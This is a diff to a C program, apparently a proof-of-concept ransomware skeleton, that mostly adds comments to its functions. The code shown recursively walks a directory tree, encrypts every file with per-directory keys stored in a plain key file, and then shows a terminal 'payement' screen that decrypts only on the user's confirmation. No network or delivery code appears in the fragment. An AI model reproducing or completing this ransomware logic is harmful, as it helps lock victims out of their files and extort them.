@@ -133,6 +133,7 @@ void list_free(list_t **lst)
     *lst = NULL;
 }
 
+// func to find the tab corresponding to the dir path in the list
 list_t	*list_search_tab(list_t *list, char *path)
 {
 	while (list)
@@ -145,7 +146,8 @@ list_t	*list_search_tab(list_t *list, char *path)
 	return (list);
 }
 
-// not secure way to store key I just use this one for the PoC 
+// not secure way to store keys I just use this one for the skeleton consider encrypt this one with 
+// a master key
 void	write_key_to_file(list_t *list)
 {
 	close(open(KEYS_FILE, O_CREAT, 0777));
@@ -248,13 +250,14 @@ char	*read_whole_file(int fd, size_t *len)
 	return (output);
 }
 
+// clear the content of a file and put back the cursor at the start
 void	clear_file(int fd, char *file)
 {
 	fclose(fopen(file, "w"));
 	lseek(fd, 0, SEEK_SET);
 }
 
-// func to encrypt and decrypt a file
+// func to encrypt a file
 void	encrypt(int fd, char *file, unsigned char key[KEY_LEN],
 				 unsigned char header[HEADER_LEN], crypto_state state)
 {
@@ -277,6 +280,7 @@ void	encrypt(int fd, char *file, unsigned char key[KEY_LEN],
 	free(plaintext);
 }
 
+// func to decrypt a file
 void	decrypt(int fd, char *file, unsigned char key[KEY_LEN],
 				 unsigned char header[HEADER_LEN], crypto_state state)
 {
@@ -303,6 +307,7 @@ void	decrypt(int fd, char *file, unsigned char key[KEY_LEN],
 	free(plaintext);
 }
 
+// update the path with new entry
 char	*update_path(char *current_path, char *added_path)
 {
 	size_t len = strlen(current_path) + strlen(added_path) + 3;
@@ -317,6 +322,9 @@ char	*update_path(char *current_path, char *added_path)
 	return (ret);
 }
 
+// recursive func that find every file within a given path
+// create the key and header used in that directory 
+// and run encrypt func to every file of that same directory
 void	encrypt_file_handler(char *path, list_t **list)
 {
 	crypto_state	state;
@@ -358,6 +366,9 @@ void	encrypt_file_handler(char *path, list_t **list)
 	closedir(dir);
 }
 
+// recursive func that find every file within a given path
+// load the key and header used in that directory 
+// and run decrypt func to every file of that same directory
 void	decrypt_file_handler(char *path, list_t **list)
 {
 	crypto_state	state;
@@ -401,6 +412,7 @@ void	decrypt_file_handler(char *path, list_t **list)
 	closedir(dir);
 }
 
+//handler for the encrypt
 void	encrypt_handler(void)
 {
 	list_t	*list = NULL;
@@ -411,6 +423,7 @@ void	encrypt_handler(void)
 	list_free(&list);
 }
 
+// handler for the decrypt
 void	decrypt_handler(void)
 {
 	list_t	*list = NULL;
@@ -422,6 +435,7 @@ void	decrypt_handler(void)
 	list_free(&list);
 }
 
+// run either encrypt or decrypt depending on the value of mode
 void	crypt_mode_handler(int mode)
 {
 	if (mode == ENCRYPT)
@@ -432,16 +446,19 @@ void	crypt_mode_handler(int mode)
 		return ;
 }
 
+// clear the terminal
 void	clear_screen(void)
 {
 	write(STDIN_FILENO, "\x1b[2J", 4);
 }
 
+// put the cursor onto the top of the terminal
 void	cursor_top(void)
 {
 	write(STDIN_FILENO, "\x1b[H", 3);
 }
 
+// screen showed after encryption
 void	payement_screen(void)
 {
 	clear_screen();
@@ -455,7 +472,7 @@ void	payement_screen(void)
 	if (c == 'y')
 	{
 		crypt_mode_handler(DECRYPT);
-	//	clear_screen();
+		clear_screen();
 	}
 	else
 		payement_screen();
